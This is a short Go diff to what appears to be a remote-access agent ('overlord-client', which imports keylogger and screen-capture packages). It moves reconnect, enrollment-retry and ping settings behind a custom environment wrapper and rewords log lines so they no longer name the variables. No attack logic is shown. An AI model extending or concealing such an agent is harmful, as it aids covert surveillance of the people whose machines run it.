@@ -10,7 +10,6 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
-	"os"
 	"runtime"
 	"runtime/debug"
 	"slices"
@@ -22,6 +21,7 @@ import (
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/config"
 	"overlord-client/cmd/agent/handlers"
+	"overlord-client/cmd/agent/internal/overlordenv"
 	"overlord-client/cmd/agent/keylogger"
 	"overlord-client/cmd/agent/plugins"
 	rt "overlord-client/cmd/agent/runtime"
@@ -382,13 +382,13 @@ func computeBaseBackoff() time.Duration {
 }
 
 func reconnectDelay() time.Duration {
-	raw := strings.TrimSpace(os.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
+	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
 	if raw == "" {
 		return randomReconnectDelay(1*time.Second, 3*time.Second)
 	}
 	ms, err := strconv.Atoi(raw)
 	if err != nil || ms < 0 {
-		log.Printf("[reconnect] invalid OVERLORD_RECONNECT_DELAY_MS=%q, using 1-3s", raw)
+		log.Printf("[reconnect] invalid development delay override %q, using 1-3s", raw)
 		return randomReconnectDelay(1*time.Second, 3*time.Second)
 	}
 	if ms == 0 {
@@ -465,7 +465,7 @@ func enrollmentRetryDelay(err error) time.Duration {
 }
 
 func getEnrollmentRetryInterval() time.Duration {
-	raw := strings.TrimSpace(os.Getenv("OVERLORD_ENROLLMENT_RETRY_MS"))
+	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_ENROLLMENT_RETRY_MS"))
 	if raw != "" {
 		if ms, err := strconv.Atoi(raw); err == nil && ms > 0 {
 			return time.Duration(ms) * time.Millisecond
@@ -475,13 +475,13 @@ func getEnrollmentRetryInterval() time.Duration {
 }
 
 func getPingInterval() time.Duration {
-	raw := strings.TrimSpace(os.Getenv("OVERLORD_PING_INTERVAL_MS"))
+	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_PING_INTERVAL_MS"))
 	if raw == "" {
 		return 30 * time.Second
 	}
 	ms, err := strconv.Atoi(raw)
 	if err != nil {
-		log.Printf("[ping] invalid OVERLORD_PING_INTERVAL_MS=%q, using 30000ms", raw)
+		log.Printf("[ping] invalid development interval override %q, using 30000ms", raw)
 		return 30 * time.Second
 	}
 	if ms <= 0 {
